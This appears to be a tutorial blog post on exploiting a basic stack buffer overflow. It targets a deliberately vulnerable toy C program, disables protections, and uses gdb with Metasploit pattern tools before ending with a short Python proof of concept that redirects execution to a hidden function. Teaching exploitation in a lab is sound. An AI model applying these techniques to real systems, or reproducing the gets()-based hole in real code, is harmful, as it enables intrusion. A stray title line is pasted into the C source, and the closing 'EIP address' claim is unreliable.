# **Basic Buffer Overflow Exploit Make Easy**

According to [Wiki](https://en.wikipedia.org/wiki/Buffer_overflow), a buffer overflow, or buffer overrun, is an anomaly where a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations. 

When buffer overflow occurs, attacker can run malicious code accordingly and may escalate the privilege as a result.

I introduce a very simple way to develop the buffer overflow exploit.  No complicated procedure can be observed.  The exploit development is running on 64-bit Kali Linux.

The following is the C source code of the ```vuln.c``` :

```c
#include <stdio.h>
 
void hacker()
{
        printf("No, I'm a hacker!\n");
}
 
void inSecure()
{
        char name[30];
        printf("What is your name?\n");
        gets(name);Basic Buffer Overflow Exploit Make Easy
        printf("Hey %s, you're harmless, aren't you?\n", name);
}
 
int main()
{
        inSecure();
        return 0;
}
```

The "hacker" function is never be called from the program.  Our aim is to run it as a result.

To compile the source to an executable :

```bash
gcc vuln.c -o vuln -fno-stack-protector -m32
```

If you cannot compiile to 32-bit, please install the following package :

```bash
sudo apt install gcc-multilib
```

To make it simple, we disable the Address Space Layout Randomization (ASLR) :

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

In order to inspect the executable file, we need to download a tool namely ```checksec.sh```.

```bash
wget https://www.trapkit.de/tools/checksec.sh
```

Since the file is in Windows DOS format, we need to change it to be Unix format and executable :

```bash
sudo apt install dos2unix

dos2unix checksec.sh

chmod +x checksec.sh
```

Run the following command and you will find out that ```NX``` is enabled.

```bash
./checksec.sh --file vuln
```
```
./checksec.sh --file vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   vuln
```

To double check the file is compiled into 32-bit.

```bash
file vuln
```
```bash
vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=bc2907521e9842167e7544516653843949dabc9e, not stripped
```

When everything is alright, we run it to see how it works.

```bash
./vuln 

What is your name?
samiux
Hey samiux, you're harmless, aren't you?
```

To see if we can crash it or not with 50 characters :

```bash
python -c 'print("A"*50)' > a.txt

cat a.txt | ./vuln

What is your name?
Hey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, you're harmless, aren't you?
Segmentation fault
```

Okay, it does crash.  Now, we fire up the gdb to do the exploit development :

```bash
gdb ./vuln
```
```bash
gdb ./vuln
 
GNU gdb (Debian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.
 
For help, type "help".
Type "apropos word" to search for commands related to "word"...
(gdb)
```

Feed in the junk characters.

```bash
(gdb)  r < a.txt
```
```bash
(gdb)  r < a.txt
Starting program: /root/Documents/vuln < a.txt
What is your name?
Hey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, you're harmless, aren't you?
 
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

The program is crashed as expected.

We check with the registers to see what had happened.

```bash
(gdb) info registers
```
```bash
(gdb) info registers
eax            0x55                0x55
ecx            0x1f                0x1f
edx            0xf7fa9890          0xf7fa9890
ebx            0x41414141          0x41414141
esp            0xffffd330          0xffffd330
ebp            0x41414141          0x41414141
esi            0xf7fa8000          0xf7fa8000
edi            0xf7fa8000          0xf7fa8000
eip            0x41414141          0x41414141
eflags         0x10286             [ PF SF IF RF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
(gdb)
```

We noticed that the EIP is overwritten with ```A```.  That means, we can control the EIP then.  Once EIP can be controlled, we can run any code from that point.  It is because EIP Instruction Pointer Register always contains the address of the next instruction to be executed.

Now, we need to find out how many junk characters to cause the crash.  We use the ```pattern_create.rb``` to create a unique pattern.

Open another terminal and run :

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50 > b.txt
```

We feed the unique pattern to the program.

```bash
(gdb) r < b.txt
```
```bash
(gdb) r < b.txt
Starting program: /root/Documents/vuln < b.txt
What is your name?
Hey Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab, you're harmless, aren't you?
 
Program received signal SIGSEGV, Segmentation fault.
0x41346241 in ?? ()
```

The program is crashed again as expected.

We check the registers again and found out that EIP is overwritten with ```0x41346241```.

```bash
(gdb) info registers
```
```bash
(gdb)  info registers
eax            0x55                0x55
ecx            0x1f                0x1f
edx            0xf7fa9890          0xf7fa9890
ebx            0x62413162          0x62413162
esp            0xffffd330          0xffffd330
ebp            0x33624132          0x33624132
esi            0xf7fa8000          0xf7fa8000
edi            0xf7fa8000          0xf7fa8000
eip            0x41346241          0x41346241
eflags         0x10286             [ PF SF IF RF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
(gdb)
```

We use the tool namely ```pattern_offset.rb``` to find out the offset.  The offset is 42 for this case.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41346241
[*] Exact match at offset 42
```

According to the source code, we know that there are 3 functions, they are main, inSecure and hacker.  Our aim here is to run hidden function ```hacker```.  So, we need to find out the address of the function of hacker.

```bash
(gdb) info functions
```
```bash
(gdb) info functions
All defined functions:
 
Non-debugging symbols:
0x56556000  _init
0x56556030  printf@plt
0x56556040  gets@plt
0x56556050  puts@plt
0x56556060  __libc_start_main@plt
0x56556070  __cxa_finalize@plt
0x56556080  _start
0x565560c0  __x86.get_pc_thunk.bx
0x565560d0  deregister_tm_clones
0x56556110  register_tm_clones
0x56556160  __do_global_dtors_aux
0x565561b0  frame_dummy
0x565561b5  __x86.get_pc_thunk.dx
0x565561b9  hacker
0x565561e4  inSecure
0x56556233  main
0x5655624f  __x86.get_pc_thunk.ax
0x56556260  __libc_csu_init
0x565562c0  __libc_csu_fini
0x565562c4  _fini
```

```bash
(gdb) disass hacker
```
```bash
(gdb) disass hacker
Dump of assembler code for function hacker:
   0x565561b9 <+0>:     push   ebp
   0x565561ba <+1>:     mov    ebp,esp
   0x565561bc <+3>:     push   ebx
   0x565561bd <+4>:     sub    esp,0x4
   0x565561c0 <+7>:     call   0x5655624f <__x86.get_pc_thunk.ax>
   0x565561c5 <+12>:    add    eax,0x2e3b
   0x565561ca <+17>:    sub    esp,0xc
   0x565561cd <+20>:    lea    edx,[eax-0x1ff8]
   0x565561d3 <+26>:    push   edx
   0x565561d4 <+27>:    mov    ebx,eax
   0x565561d6 <+29>:    call   0x56556050 <puts@plt>
   0x565561db <+34>:    add    esp,0x10
   0x565561de <+37>:    nop
   0x565561df <+38>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x565561e2 <+41>:    leave  
   0x565561e3 <+42>:    ret    
End of assembler dump.
(gdb)
```

We find out that the address of function hacker is ```0x565561b9```.

Now, the payload will be as the following :

42's "A" and (the address of hacker function)

The PoC Python code "poc.py" :

```python
import struct
 
def p(x):
        return struct.pack("<L", x)
 
offset = 42
hacker = 0x565561b9
 
payload = ""
payload += "A" * offset
payload += p(hacker)
 
print payload
```

Exploit it now :

```bash
python poc.py | ./vuln

What is your name?  
Hey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�aUV, you're harmless, aren't you?  
No, I'm a hacker!  
Segmentation fault  
```

The hidden hacker function is ran as a result.


## Bonus 

To find the EIP address :

```bash
python -c 'print("A"*42)+ "B"*4' > c.txt
```
```
(gdb) r < c.txt
```
```bash
(gdb) r < c.txt
Starting program: /root/Documents/vuln < c.txt
What is your name?
Hey AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB, you're harmless, aren't you?
 
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```
```bash
(gdb) info registers
```
```bash
(gdb) info registers
eax            0x51                0x51
ecx            0x1f                0x1f
edx            0xf7fa9890          0xf7fa9890
ebx            0x41414141          0x41414141
esp            0xffffd330          0xffffd330
ebp            0x41414141          0x41414141
esi            0xf7fa8000          0xf7fa8000
edi            0xf7fa8000          0xf7fa8000
eip            0x42424242          0x42424242
eflags         0x10286             [ PF SF IF RF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
(gdb)
```
```bash
(gdb) x/50xw $esp -100
```
```bash
(gdb) x/50xw $esp -100
0xffffd2cc: 0xf7e20946  0xf7fa8d80  0x56557030  0xffffd2f4
0xffffd2dc: 0xf7e20920  0x56557030  0xf7ffd950  0xf7e20925
0xffffd2ec: 0x5655622a  0x56557030  0xffffd302  0x00000000
0xffffd2fc: 0x565561f0  0x414183fc  0x41414141  0x41414141
0xffffd30c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd31c: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffd32c: 0x42424242  0xf7fa8000  0xf7fa8000  0x00000000
0xffffd33c: 0xf7de8b41  0x00000001  0xffffd3d4  0xffffd3dc
0xffffd34c: 0xffffd364  0x00000001  0x00000000  0xf7fa8000
0xffffd35c: 0xffffffff  0xf7ffd000  0x00000000  0xf7fa8000
0xffffd36c: 0xf7fa8000  0x00000000  0x624de69b  0x20fd608b
0xffffd37c: 0x00000000  0x00000000  0x00000000  0x00000001
0xffffd38c: 0x56556080  0x00000000
```

The EIP address is ```0xffffd32c```.


Samiux  
OSCE OSCP OSWP  
May 9, 2019, Hong Kong, China  

